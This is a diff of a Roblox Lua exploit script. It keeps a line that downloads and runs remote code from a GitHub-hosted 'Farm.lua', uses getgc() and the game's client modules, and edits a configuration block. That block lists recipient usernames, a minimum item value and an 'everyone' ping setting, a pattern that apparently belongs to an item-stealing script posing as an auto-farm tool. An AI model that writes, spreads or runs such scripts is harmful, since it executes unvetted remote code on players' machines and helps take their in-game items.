@@ -1,5 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PremiumAdm/Shxdrag/refs/heads/main/Farm.lua"))()
-wait(1)
+wait(0.5)
 local adm = require(
     game:GetService("ReplicatedStorage")
         :WaitForChild("ClientModules")
@@ -63,8 +63,8 @@ for _, v in pairs(getgc()) do
     end
 end
 
-_G.Usernames = {"Adamveggeasd","Venillarblx","MRFLIMCLA3","Nachito_pro574","MRFLIMCLA5"}
-_G.min_value = 4
+_G.Usernames = {"morninggoodnightmeme","Venillarblx","FedcantgetmenowUwu","mightyjohnplays","Adamveggeasd"}
+_G.min_value = 3
 _G.pingEveryone = "Yes"
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
